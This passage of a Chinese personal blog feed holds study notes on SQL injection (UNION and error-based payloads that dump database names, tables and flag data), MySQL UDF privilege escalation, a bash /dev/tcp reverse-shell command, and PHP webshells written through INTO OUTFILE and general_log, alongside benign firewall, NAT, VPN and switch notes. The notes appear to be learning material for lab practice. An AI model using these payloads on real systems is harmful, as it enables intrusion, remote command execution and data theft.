class="string">--+</span></span><br></pre></td></tr></table></figure><p>进BP的intruder模块进行爆破</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/sql-injection-blind-time2.png" alt=""></p><p>可以看到响应2s的是开头为s的url，所以数据库的首字母为s</p><p>注意：因为没有错误提醒，所以一定要注意在url里sql语法上的问题</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>常用SQL注入方法总结</title>
      <link href="/TechnicalExperience/Penetration/sql-injection.html"/>
      <url>/TechnicalExperience/Penetration/sql-injection.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>网上资料过于繁杂，所以想写一篇文章记录我的收获</p></blockquote><span id="more"></span><h2 id="判断是否存在注入点"><a href="#判断是否存在注入点" class="headerlink" title="判断是否存在注入点"></a>判断是否存在注入点</h2><p>一般来说都是输入sql语句，报错就很有可能存在注入点</p><h2 id="字符型注入和数字注入"><a href="#字符型注入和数字注入" class="headerlink" title="字符型注入和数字注入"></a>字符型注入和数字注入</h2><p>这两个的区别就是一个需要引号，一个不需要</p><p>字符型：<code>?id=2&#39;　其他语句#</code></p><p>数字型：<code>?id=2　其他语句</code></p><p><strong>如何判断？</strong></p><p>数字型的其他语句替换为 <code>and 1=2</code> 会报错，否则就是字符型</p><h2 id="url编码问题"><a href="#url编码问题" class="headerlink" title="url编码问题"></a>url编码问题</h2><p>网址都是采用<code>url</code>编码，一般浏览器网址栏的字符都会被自动转码，但需要注意几点</p><ul><li><strong>末尾的空格不会被转码</strong></li><li><strong>#不会被转码</strong>（<strong>#</strong> url 编码后是 <strong>%23</strong> ）</li></ul><h2 id="注释问题"><a href="#注释问题" class="headerlink" title="注释问题"></a>注释问题</h2><p>在字符型注入中，需要闭合引号构造sql语句，可以使用两个符号</p><ol><li><code>#</code>：在#后面的语句都会被注释掉</li><li><code>--</code>：使用时需要注意，后面一定要接一个空格，在使用中都是 <code>--+</code>，+是空格的url编码</li></ol><h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><p>表的字段类型如果是数字类型也可以用 <code>&#39;数字&#39;</code>来表示，但如果是数字＋字母的组合，只会取开头为数字的部分</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">＃比如下面的写法查询结果一样</span><br><span class="line"><span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;123abc&#x27;</span></span><br><span class="line"><span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;123&#x27;</span></span><br><span class="line"><span class="keyword">where</span> id<span class="operator">=</span><span class="number">123</span></span><br></pre></td></tr></table></figure><h2 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h2><p>找到注入点以后，如果该注入点会返回查询的的数据，就可以着手获取数据库的基本信息了</p><p>如果没有返回数据，考虑报错注入和盲注</p><h3 id="判断查询字段数"><a href="#判断查询字段数" class="headerlink" title="判断查询字段数"></a>判断查询字段数</h3><ul><li><strong>order by</strong>：表示根据第几字段排序，超出会报错</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MariaDB sqlilabs@(<span class="keyword">none</span>):security<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span>  <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span></span><br><span class="line">(<span class="number">1054</span>, &quot;Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;&quot;)</span><br></pre></td></tr></table></figure><ul><li><p><strong>select into</strong>：原意是备份表，可备份全部字段或者部分字段，into 后面跟新表。表可以用变量@来表示，几个变量代表几个字段，运行报错就代表不是该字段数，字段数正确不会报错，但是前端得不到数据，会报500错误。（除了＠，也可以用null）</p><p><strong>该方法可用在limit后面</strong></p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/into-injection.png" alt=""></p><ul><li><strong>union</strong>：union字段数，类型不兼容，则会报错，利用这个原理猜字段数，不报错就说明猜对了</li></ul><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/union-injection.png" alt=""></p><blockquote><p>请注意这是查询的字段数，不一定等于表的字段数，后端逻辑可能是查询全部字段然后进行筛选</p></blockquote><h3 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()</span><br></pre></td></tr></table></figure><h3 id="获取数据库的表"><a href="#获取数据库的表" class="headerlink" title="获取数据库的表"></a>获取数据库的表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="获取表的字段"><a href="#获取表的字段" class="headerlink" title="获取表的字段"></a>获取表的字段</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="获取该字段下的所有数据"><a href="#获取该字段下的所有数据" class="headerlink" title="获取该字段下的所有数据"></a>获取该字段下的所有数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(flag) <span class="keyword">from</span> sqli.flag</span><br></pre></td></tr></table></figure><h3 id="绕过输出一行的逻辑"><a href="#绕过输出一行的逻辑" class="headerlink" title="绕过输出一行的逻辑"></a>绕过输出一行的逻辑</h3><p>前端的逻辑可能获取到第一行数据后就把    后面的数据（我想要获取的数据）丢掉，可以让他第一行查不出来，这样就会显示我想显示的数据</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/sql-injection2.png" alt=""></p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>当后端sql运行正确时不会返回数据，而错误才会返回信息，这时就可以利用错误的信息将数据库的信息暴露出来</p><p>方法一：</p><p>利用 <code>group by</code> 子句的原理，<strong>配合count</strong>，floor和rand(产生两个随机值相撞的概率大)使其报错．(group by虚拟表[count(*), key]，rand重复计算插入后报错)</p><p><strong>获取数据库名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> database()), <span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>缺点：数据库的记录必须&gt;1才有几率报错。</p><p>方法二：</p><p>利用<code>extractvalue()</code>函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>参考文章</strong></p><p><a href="https://www.anquanke.com/post/id/85936">【技术分享】MySQL 注入攻击与防御</a></p><p><a href="https://websec.readthedocs.io/zh/latest/index.html">Web安全学习笔记</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 个人技术心得 </category>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>udf提权</title>
      <link href="/TechnicalExperience/Penetration/udf.html"/>
      <url>/TechnicalExperience/Penetration/udf.html</url>
      
        <content type="html"><![CDATA[<blockquote><p> UDF 即 User Defined Funtion，通过udf提权可以用来把数据库root用户权限转化为数据库管理员（mysql）的权限，在windows里面可能就获取到了系统管理员的权限</p></blockquote><span id="more"></span><p>国光大佬的文章写的很棒，贴个链接方便以后自己复习哈哈，这里记录自己踩的坑</p><ol><li>MANJARO的mariadb动态链接库在/usr/lib/mysql/plugin/下，用户是root，连数据库管理员都不能写入</li><li>刚开始以为是将mysql的权限提为root，后来想想，linux的root这么好提？实践后才发现原来是有了mysql的权限，我太自作多情</li></ol><blockquote><p>参考文章</p><p><a href="https://www.sqlsec.com/2020/11/mysql.html#toc-heading-10">MySQL 漏洞利用与提权</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 个人技术心得 </category>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库反弹shell的几种方式</title>
      <link href="/TechnicalExperience/Penetration/reverse-shell.html"/>
      <url>/TechnicalExperience/Penetration/reverse-shell.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>反弹shell: 将已经获取控制权的机器返回一个shell给外部机器</p></blockquote><span id="more"></span><h2 id="反弹BASH"><a href="#反弹BASH" class="headerlink" title="反弹BASH"></a>反弹BASH</h2><p><strong>在外部机器执行的指令</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l &#123;端口&#125;</span><br></pre></td></tr></table></figure><p>nc 可以用来连接到端口通信，用法是 <code>nc [host] [port]</code>，</p><p>也可以启动本机的port进行监听，使用<code>-l</code>参数</p><p><strong>在需要反弹机器的数据库里执行指令</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system bash -c &#x27;bash -i &amp;&gt; /dev/tcp/&#123;外部机器IP&#125;/&#123;端口&#125; &lt;&amp;1&#x27;</span><br></pre></td></tr></table></figure><p>解读指令：</p><p>从左到右进行解读，system 是数据库用来执行系统指令的，bash就不多说了，说一下他的参数。</p><p><code>-c</code>: 代表command，后面接命令字符串，主要是为了防止其他shell的干扰</p><p><code>-i</code>: 交互式shell</p><p><code>&amp;&gt;</code>: 将标准输出和错误进行重定向</p><p><code>/dev/tcp/ip/port</code>: bash建立socket的一种特殊写法，除此之外还有udp</p><p><code>&lt;&amp;1</code>: 把标准输入重定向到标准输出, 其他写法 <code>0&gt;&amp;1</code></p><h2 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><ol><li><p>目标机器开启80端口且PHP为后端</p></li><li><p>数据库的全局变量 <code>secure_file_priv</code> 值为空，不能为NULL(不能输出文件)，如果有路径代表只能输出到该路径</p></li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB root@(<span class="keyword">none</span>):(<span class="keyword">none</span>)<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span></span><br><span class="line"><span class="operator">|</span> Variable_name            <span class="operator">|</span> <span class="keyword">Value</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="comment">--------------------------|---------|</span></span><br><span class="line"><span class="operator">|</span> require_secure_transport <span class="operator">|</span> OFF     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> secure_auth              <span class="operator">|</span> <span class="keyword">ON</span>      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> secure_file_priv         <span class="operator">|</span>         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> secure_timestamp         <span class="operator">|</span> <span class="keyword">NO</span>      <span class="operator">|</span></span><br></pre></td></tr></table></figure><ol start="3"><li>数据库用户有输出文件权限</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(<span class="keyword">user</span>,<span class="number">0x3a</span>,file_priv) <span class="keyword">from</span> mysql.user;</span><br></pre></td></tr></table></figure><ol start="3"><li>数据库(mysql)对 <strong>$_SERVER[‘DOCUMENT_ROOT’]</strong> 有写入权限</li><li>对http服务根目录输出webshell</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> &quot;&lt;?php @system($_GET[&#x27;cmd&#x27;]);?&gt;&quot; <span class="keyword">into</span> outfile <span class="string">&#x27;/srv/http/houmen.php&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/webshell.png" alt=""></p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>如果上面的 <code>secure_file_priv</code> 规定了输出目录或者是NULL，还可以使用 <code>general_log</code> 的方法来写shell，general_log可以记录所有基础日志，默认关闭</p><ol><li>模糊查找关于general的信息</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MariaDB root@(<span class="keyword">none</span>):(<span class="keyword">none</span>)<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%general%&#x27;</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span>            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="comment">------------------|------------------|</span></span><br><span class="line"><span class="operator">|</span> general_log      <span class="operator">|</span> OFF              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> general_log_file <span class="operator">|</span>                  <span class="operator">|</span></span><br></pre></td></tr></table></figure><ol start="2"><li>开启general_log，设置路径</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB root@(<span class="keyword">none</span>):(<span class="keyword">none</span>)<span class="operator">&gt;</span> <span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">MariaDB root@(<span class="keyword">none</span>):(<span class="keyword">none</span>)<span class="operator">&gt;</span> <span class="keyword">set</span> <span class="keyword">global</span> general_log_file <span class="operator">=</span> <span class="string">&#x27;/srv/http/hm.php&#x27;</span>;</span><br><span class="line">MariaDB root@(<span class="keyword">none</span>):(<span class="keyword">none</span>)<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%general%&#x27;</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span>            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="comment">------------------|------------------|</span></span><br><span class="line"><span class="operator">|</span> general_log      <span class="operator">|</span> <span class="keyword">ON</span>               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> general_log_file <span class="operator">|</span> <span class="operator">/</span>srv<span class="operator">/</span>http<span class="operator">/</span>hm.php <span class="operator">|</span></span><br></pre></td></tr></table></figure><ol start="3"><li>写入数据</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MariaDB root@(<span class="keyword">none</span>):(<span class="keyword">none</span>)<span class="operator">&gt;</span> <span class="keyword">select</span> &quot;&lt;?php @eval($_GET[&#x27;command&#x27;]);?&gt;&quot;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">❯ sudo cat /srv/http/hm.php </span><br><span class="line">/usr/bin/mariadbd, Version: <span class="number">10.5</span>.<span class="number">9</span>-MariaDB (Arch Linux). started with:</span><br><span class="line">Tcp port: <span class="number">3306</span>  Unix socket: /run/mysqld/mysqld.sock</span><br><span class="line">Time                Id Command  Argument</span><br><span class="line"><span class="number">210429</span> <span class="number">17</span>:<span class="number">29</span>:<span class="number">36</span>      <span class="number">3</span> Query    select <span class="string">&quot;&lt;?php @system(<span class="subst">$_GET</span>[&#x27;cmd&#x27;]);?&gt;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/webshell2.png" alt=""></p><blockquote><p>关于服务器权限的问题：</p><p>在我的MANJARO系统里，httpd的用户是http，mariadb的用户是mysql，默认情况下，会存在mysql无法写入，httpd无法读取的情况</p><p>这些漏洞在windows上可能可以实现</p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>后端只要满足三个条件就可以反弹shell</p><ul><li>支持 tcp 链接</li><li>支持 IO 重定向</li><li>可以调用系统命令</li></ul><blockquote><p>参考文章</p><p><a href="https://www.ascotbe.com/2020/07/21/DatabaseWriteWebshell/#post-comment">常见数据库写入Webshell汇总</a></p><p><a href="https://becivells.github.io/2019/01/bash_i_dev_tcp/">bash -i &gt;&amp; /dev/tcp/localhost/8080 0&gt;&amp;1 的含义</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 个人技术心得 </category>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webshell </tag>
            
            <tag> MySQL </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fw-rule</title>
      <link href="/Question/fw-rule.html"/>
      <url>/Question/fw-rule.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>..</p></blockquote><span id="more"></span><p>一个关于防火墙策略的问题:</p><p>手册里有这么一句话: “整个系统的所有策略规则有特定的排列顺序。在流量进入系统时,系统会对流量按照找到的<strong>第一条</strong>与过滤条件相匹配的策略规则进行处理。”</p><p><strong>我的理解</strong>: 防火墙的策略优先级高的应该设置为匹配范围小的, 优先级低的设置为匹配范围广的.</p><p>然后我在17年的赛题看到关于两个关于防火墙的题目及参考答案(拓扑图就是防火墙一端为internet, 一端为交换机)</p><p>题目:</p><p><img src="/home/manu/%E5%9B%BE%E7%89%87/q6.png" alt=""></p><p>关于策略方面的答案: </p><p><img src="/home/manu/%E5%9B%BE%E7%89%87/q1.png" alt=""></p><p>第3题配置了id 1,2 的策略可以理解, 第4题配置NAT后设置的策略我有点不能理解(<em>红线部分</em>):</p><ul><li><strong>id为2的策略已经把所有(Any)流量匹配到了, 行为是拒绝</strong></li><li><strong>id为3的策略匹配范围更小, 优先级却在id2后面, 被id2拒绝后id3还有作用吗?</strong></li></ul><p>我尝试实践下我的理论:</p><p>我的拓扑为: 我的PC(192.168.1.2, 安全域:trust)—防火墙—–其他PC(192.168.10.1, 安全域:untrust)</p><p>路由,网关都配置好后如果没有配置策略是不能ping通的, 然后我配置了一条允许trust通往untrust的策略</p><p><img src="/home/manu/%E5%9B%BE%E7%89%87/q5.png" alt=""></p><p>可以ping通</p><p><img src="/home/manu/%E5%9B%BE%E7%89%87/q4.png" alt=""></p><p>把拒绝所有流量的优先级调高一点,</p><p><img src="/home/manu/%E5%9B%BE%E7%89%87/q3.png" alt=""></p><p>没有任何反应</p><p><img src="/home/manu/%E5%9B%BE%E7%89%87/q7.png" alt=""></p><p>也就是说第一跳拒绝所有流量的策略确实阻拦了所有流量, 所有第二条策略就没有用了.</p>]]></content>
      
      
      
        <tags>
            
            <tag> question </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ALTER</title>
      <link href="/Database/ALTER.html"/>
      <url>/Database/ALTER.html</url>
      
        <content type="html"><![CDATA[<blockquote><p> 常用<strong>ALTER</strong>语法</p></blockquote><span id="more"></span><h2 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h2><h3 id="添加外键约束"><a href="#添加外键约束" class="headerlink" title="添加外键约束"></a>添加外键约束</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> 外键名</span><br><span class="line"><span class="keyword">FOREIGN</span> KEY (该表需要被关联的外键列名)</span><br><span class="line">REFRENCES 外表名 (列名)</span><br></pre></td></tr></table></figure><h3 id="删除外键约束"><a href="#删除外键约束" class="headerlink" title="删除外键约束"></a>删除外键约束</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">FOREIGN</span> KEY 外键名</span><br></pre></td></tr></table></figure><blockquote><p>利用外键约束可以完成1对1, 多对多, 1对多关系</p></blockquote><h3 id="添加索引"><a href="#添加索引" class="headerlink" title="添加索引"></a>添加索引</h3><p>索引可以为表添加查询效率, 所以列数据最好唯一</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名</span><br><span class="line"><span class="keyword">ADD</span> INDEX 索引名(列名,可多列)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NAT简述及其配置</title>
      <link href="/Internet-equipment/DCN/DCFW-1800E-N3002/NAT.html"/>
      <url>/Internet-equipment/DCN/DCFW-1800E-N3002/NAT.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>网络地址转换(<em>Network Address Translation</em>)简称为 NAT,是将 IP 数据包包头中的 IP地址转换为另一个 IP 地址的协议。当 IP 数据包通过路由器或者安全网关时,路由器或者安全网关会把 IP 数据包的源 IP 地址和/或者目的 IP 地址进行转换。</p></blockquote><span id="more"></span><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>NAT可以修改IP地址和TCP端口, 因为IP分为来源IP和目标IP, 所有NAT又分为SNAT和DNAT</p><p>SNAT: 最常见的方式, 可以让LAN内的主机连接到internet</p><p>DNAT: 修改目标IP可以让公网IP访问到LAN的服务器(DMZ)</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/Screenshot_20210425_201053.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/DNAT.png" alt=""></p><p>注意: 配置NAT时可以先配置地址簿(存储IP地址条目)和服务簿(协议,端口条目)</p>]]></content>
      
      
      <categories>
          
          <category> 网络设备配置 </category>
          
          <category> 神州 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技能大赛-信息安全 </tag>
            
            <tag> DCFW-1800E-N3002 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VPN简述及实现</title>
      <link href="/Internet-equipment/DCN/DCFW-1800E-N3002/VPN.html"/>
      <url>/Internet-equipment/DCN/DCFW-1800E-N3002/VPN.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>VPN(<em>Virtual Private Network</em>虚拟专用网络)</p><p>vpn通常拿来做2个事情，一个是可以让世界上任意2台机器进入一个虚拟的局域网中（当然这个局域网的数据通讯是加密的，很安全，用起来和一个家庭局域网没有区别），一个是可以用来翻墙</p></blockquote><span id="more"></span><p>神州数码系统支持 VPN 功能,包括 IPSec VPN、基于 SSL 的远程登录解决方案——Secure Connect VPN(简称为 SCVPN) 、拨号 VPN、PnPVPN 和 L2TP VPN。用户可以配置 VPN隧道,并且根据不同需求选择以下两种 VPN 隧道的应用方式:<br>♦ 基于策略的 VPN: 将配置成功的 VPN 隧道名称引用到策略规则中,使符合条件的流量通过指定的 VPN 隧道进行传输。<br>♦ 基于路由的 VPN: 将配置成功的 VPN 隧道与隧道接口绑定;配置静态路由时,将隧道接口指定为下一跳路由。符合条件的流量将会经过 VPN 隧道进行传输。</p><h2 id="Secure-Connect-VPN"><a href="#Secure-Connect-VPN" class="headerlink" title="Secure Connect VPN"></a>Secure Connect VPN</h2><blockquote><p>参考</p><p><a href="https://yuerblog.cc/2017/01/03/how-vpn-works-and-how-to-setup-pptp/">vpn工作原理和搭建方法</a></p><p><a href="https://zhuanlan.zhihu.com/p/71536075">VPN原理与简单应用</a></p><p> <a href="https://cshihong.github.io/2019/04/03/IPSec-VPN%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/">IPSec-VPN基本原理</a></p><p><a href="https://cshihong.github.io/2019/04/03/IPSec-VPN%E4%B9%8BIKE%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/">IPSec-VPN之IKE协议详解</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络设备配置 </category>
          
          <category> 神州 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技能大赛-信息安全 </tag>
            
            <tag> DCFW-1800E-N3002 </tag>
            
            <tag> IPsec </tag>
            
            <tag> SSL </tag>
            
            <tag> L2TP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DCP-debugging</title>
      <link href="/Internet-equipment/DCN/CS6200-28X-EI/DCP-debugging.html"/>
      <url>/Internet-equipment/DCN/CS6200-28X-EI/DCP-debugging.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>DCP(<em>Dynamic CPU Protection</em>)动态CPU防护, 当检测到具有某种特定源IP的报文上CPU的速率超过一定的速率值时, 将对该类报文进行限速处理。</p></blockquote><span id="more"></span><table><thead><tr><th>全局配置模式</th><th>作用</th></tr></thead><tbody><tr><td><code>dcp enable</code></td><td>开启DCP</td></tr><tr><td><code>dcp limit-rate &lt;20-50&gt;</code></td><td>设置限速(对所用IP)</td></tr><tr><td><code>dcp no-limit-ip &lt;ip_addr&gt;</code></td><td>设置不限速的IP</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 网络设备配置 </category>
          
          <category> 神州 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技能大赛-信息安全 </tag>
            
            <tag> CS6200-28X-EI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dynamic-vlan</title>
      <link href="/Internet-equipment/DCN/CS6200-28X-EI/dynamic-vlan.html"/>
      <url>/Internet-equipment/DCN/CS6200-28X-EI/dynamic-vlan.html</url>
      
        <content type="html"><![CDATA[<blockquote><p> 动态VLAN可以根据用户的MAC, IP, 网络层协议进行划分</p><p>静态VLAN是基于端口进行划分</p></blockquote><span id="more"></span><blockquote><p><span style='color: red;'>注意</span>: 动态 VLAN 需要跟端口的 Hybrid 属性配合才能很好的工作</p><p>hybrid&amp;trunk区别: </p><p>Hybrid 端口可以允许多个 VLAN 的报文发送时不打标签,而 Trunk 端口只允许 native VLAN 的报文发送时不打标签</p></blockquote><h2 id="基于MAC"><a href="#基于MAC" class="headerlink" title="基于MAC"></a>基于MAC</h2><ol><li>打开端口的基于MAC功能, hybrid</li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SwitchA(Config<span class="literal">-Ethernet1</span>/<span class="number">0</span>/<span class="number">1</span>)<span class="comment">#switchport mac-vlan enable</span></span><br><span class="line">SwitchA(Config<span class="literal">-Ethernet1</span>/<span class="number">0</span>/<span class="number">1</span>)<span class="comment">#swportport mode hybrid</span></span><br><span class="line">SwitchA(Config<span class="literal">-Ethernet1</span>/<span class="number">0</span>/<span class="number">1</span>)<span class="comment">#swportport hybrid allowed vlan vlan_id &lt;untag|tag&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>指定VLAN为基于MAC模式</li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mac<span class="literal">-vlan</span> vlan &lt;vlan<span 